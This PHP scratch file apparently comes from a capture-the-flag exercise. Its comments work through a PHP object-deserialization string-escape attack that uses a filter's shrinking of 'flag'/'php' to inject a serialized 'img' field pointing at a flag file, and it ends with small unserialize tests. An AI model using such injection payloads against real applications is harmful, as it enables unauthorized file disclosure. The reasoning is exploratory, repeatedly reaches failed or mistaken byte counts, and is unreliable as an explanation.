<?php
// I see! PHP's unserialize is lenient about extra content after the serialized data.
// 
// This means if we can make the parser read our injected content and then continue parsing,
// it will work!

// Let me think about this more carefully.
// 
// The key insight: when the filter SHRINKS the string, PHP reads past the closing quote.
// 
// After reading N bytes, PHP expects a closing quote.
// If the Nth byte is a closing quote, PHP will see it and continue parsing!
// 
// So we need to craft the payload so that the Nth byte is a closing quote.

// Let me trace through with a specific example:
// 
// user = 'flag' + '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// Serialized: s:45:"flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:45:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads 45 bytes from position after opening quote.
// 
// The content after the opening quote is:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Let me count the bytes:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// " = 1
// ; = 1
// s = 1
// : = 1
// 3 = 1
// : = 1
// " = 1
// i = 1
// m = 1
// g = 1
// " = 1
// ; = 1
// s = 1
// : = 1
// 2 = 1
// 0 = 1
// : = 1
// " = 1
// Z = 1
// D = 1
// B = 1
// n = 1
// M = 1
// 1 = 1
// 9 = 1
// m = 1
// M = 1
// W = 1
// F = 1
// n = 1
// L = 1
// n = 1
// B = 1
// o = 1
// c = 1
// A = 1
// = = 1
// = = 1
// " = 1
// ; = 1
// } = 1
// Total: 41 bytes

// So the injection is 41 bytes.
// 
// PHP reads 45 bytes from the 41-byte injection.
// PHP reads: 41 bytes of injection + 4 bytes from the next field.
// 
// The next field is: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP reads: ";s: (4 bytes)
// 
// Total: 41 + 4 = 45 bytes
// 
// The 45th byte is: : (from ";s:)
// 
// PHP expects a closing quote, but the next char is 8 (from "8:function")
// Error!

// So we need to adjust the payload so that the 45th byte is a closing quote.
// 
// One approach: add padding to the injection so that the 45th byte is a closing quote.
// 
// Let me think about this:
// 
// We want the 45th byte to be a closing quote.
// The 45th byte is the last byte of the 45-byte read.
// 
// If we add 4 bytes of padding before the closing quote of the injection,
// the 45th byte would be the closing quote!
// 
// Injection: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";XXXX}
// 
// Wait, that doesn't make sense. Let me think again.

// Actually, the issue is that the 45th byte is part of the next field.
// We can't control the next field directly.
// 
// But wait, we CAN control the next field if we use the escape to "consume" it!
// 
// The key insight: if we use multiple 'flag's, we generate more overflow.
// Each 'flag' generates 4 bytes of overflow.
// 
// If we have N 'flag's, we generate 4*N bytes of overflow.
// 
// The remaining original structure is 73 bytes.
// If we generate 73 bytes of overflow, we consume the entire remaining structure!
// 
// 73 / 4 = 18.25, so we need 19 'flag's = 76 bytes of overflow.
// That's 3 bytes too many!
// 
// What if we use a combination of 'flag' (4 bytes) and 'php' (3 bytes)?
// 
// 73 = 4*16 + 3*3 = 64 + 9 = 73
// 
// So we need 16 'flag's + 3 'php's = 73 bytes of overflow!

// Let me test this:
// user = 'flag' * 16 + 'php' * 3 + injection
// 
// 'flag' * 16 = 64 bytes
// 'php' * 3 = 9 bytes
// injection = ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";} = 41 bytes
// Total: 64 + 9 + 41 = 114 bytes
// 
// After filter: 41 bytes
// 
// Serialized: s:114:"flag...flagphp...php";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:114:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads 114 bytes from the 41-byte injection.
// PHP reads: 41 bytes of injection + 73 bytes from the next field.
// 
// The next field is: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// That's exactly 73 bytes!
// 
// Total: 41 + 73 = 114 bytes
// 
// The 114th byte is: }
// PHP expects a closing quote, but there's no more content!
// Error!

// Hmm, this still doesn't work because the 114th byte is not a closing quote.

// Let me think about this differently.
// 
// The key insight: we want the Nth byte to be a closing quote.
// 
// The Nth byte is the last byte of the N-byte read.
// We want this to be a closing quote.
// 
// The content after the empty string is:
// injection + remaining structure
// 
// We want the last byte of the N-byte read to be a closing quote.
// 
// If we can make the remaining structure end with a closing quote...
// 
// But the remaining structure ends with: ";}
// 
// Hmm, the last byte is }, not a closing quote.

// Wait, I think I'm overcomplicating this.
// 
// Let me re-read the serialized format:
// s:N:"CONTENT";
// 
// After reading N bytes of CONTENT, PHP reads the closing quote and semicolon.
// 
// If the Nth byte is a closing quote, PHP will read it as part of CONTENT,
// and then expect another closing quote!
// 
// So we need the (N+1)th byte to be a closing quote!
// 
// Hmm, this is getting confusing. Let me just test different approaches.

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// Approach 1: Use the escape to inject a new img value
// 
// The idea: make the parser read our injected content as a valid serialized structure
// 
// user = 'flag' * 16 + 'php' * 3 + '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// After filter: '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// Serialized: s:114:"flag...flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:114:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads 114 bytes from ""
// Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// That's 41 + 73 = 114 bytes!
// 
// The 114th byte is: }
// PHP expects a closing quote, but sees end of string
// Error!

// Let me try a different approach:
// What if we add a closing quote at the end of the injection?
// 
// user = 'flag' * 16 + 'php' * 3 + '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";'
// 
// After filter: '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";'
// 
// Length: 42 bytes
// 
// Serialized: s:115:"flag...flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";"
// After filter: s:115:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";"
// 
// PHP reads 115 bytes from ""
// Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// That's 42 + 73 = 115 bytes!
// 
// The 115th byte is: }
// PHP expects a closing quote, but sees end of string
// Error!

// Hmm, this is still not working.

// Let me try yet another approach:
// What if we use the escape to close the array early?
// 
// user = 'flag' * 16 + 'php' * 3 + '";}'
// 
// After filter: '";}'
// 
// Length: 3 bytes
// 
// Serialized: s:76:"flag...flag";}"
// After filter: s:76:"";}"
// 
// PHP reads 76 bytes from ""
// Content: ";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// That's 3 + 73 = 76 bytes!
// 
// The 76th byte is: }
// PHP expects a closing quote, but sees end of string
// Error!

// I think the issue is that PHP expects a closing quote after reading N bytes.
// But the content doesn't end with a closing quote.

// Let me try adding a closing quote at the end:
// user = 'flag' * 16 + 'php' * 3 + '";}";'
// 
// After filter: '";}";'
// 
// Length: 5 bytes
// 
// Serialized: s:78:"flag...flag";}";"
// After filter: s:78:"";}";"
// 
// PHP reads 78 bytes from ""
// Content: ";}";";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// That's 5 + 73 = 78 bytes!
// 
// The 78th byte is: }
// PHP expects a closing quote, but sees end of string
// Error!

// I'm clearly missing something. Let me step back and think about this more fundamentally.

// The serialized format is: s:N:"CONTENT";
// 
// PHP reads:
// 1. s:N:" - identifies a string of length N
// 2. Reads N bytes as CONTENT
// 3. Reads "; - closing quote and semicolon
// 
// If CONTENT is shorter than N, PHP reads past the closing quote.
// 
// After reading N bytes, PHP expects "; (closing quote and semicolon).
// 
// So we need the Nth byte to be followed by ";!

// Let me trace through with a specific example:
// s:4:"";s:8:"function"
// 
// PHP reads:
// 1. s:4:" - string of length 4
// 2. Reads 4 bytes from position after opening quote
//    Position after opening quote: " (closing quote of empty string)
//    Reads: " (1), ; (2), s (3), : (4) = 4 bytes
//    CONTENT = ";s:
// 3. Reads "; - closing quote and semicolon
//    Next char: 8
//    Expected ", got 8
//    Error!

// So PHP reads the closing quote as part of CONTENT, then expects another closing quote!

// The trick is to make the content after N bytes be ";!
// 
// For example:
// s:4:"xy";s:8:"function"
// 
// PHP reads:
// 1. s:4:" - string of length 4
// 2. Reads 4 bytes: x, y, ", ;
//    Wait, that's only 4 bytes: x, y, ", ;
//    Hmm, but " and ; are part of the serialized format!
// 
// Actually, I think I'm still confused. Let me test this.

$test = 's:4:"xy";';
echo "Test: $test\n";
$result = @unserialize($test);
echo "Result: ";
var_dump($result);
echo "\n";

// Test with extra content
$test2 = 's:4:"xy";s:8:"function"';
echo "Test: $test2\n";
$result2 = @unserialize($test2);
echo "Result: ";
var_dump($result2);
echo "\n";

// Test with length mismatch
$test3 = 's:6:"xy";s:8:"function"';
echo "Test: $test3\n";
$result3 = @unserialize($test3);
echo "Result: ";
var_dump($result3);
echo "\n";

// Test with length mismatch that reads into next field
$test4 = 's:10:"xy";s:8:"function"';
echo "Test: $test4\n";
$result4 = @unserialize($test4);
echo "Result: ";
var_dump($result4);
echo "\n";

